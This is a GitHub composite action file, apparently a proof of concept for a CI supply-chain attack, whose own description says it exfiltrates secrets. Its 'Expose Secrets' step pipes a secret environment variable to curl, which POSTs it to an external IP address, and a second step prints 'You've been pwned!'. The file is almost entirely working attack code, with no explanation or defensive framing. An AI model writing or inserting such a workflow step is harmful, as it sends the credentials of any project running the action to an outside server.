name: "RepoC Action"
description: "Final action interacting with RepoB and exfiltrating secrets"

inputs:
  token:
    description: "GitHub Token for accessing RepoB"
    required: true

runs:
  using: "composite"
  steps:
    - name: Expose Secrets
      run: |
        echo "$SECRET_VAR" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
      shell: bash

    - name: Dummy Step
      run: echo "You've been pwned!"
      shell: bash
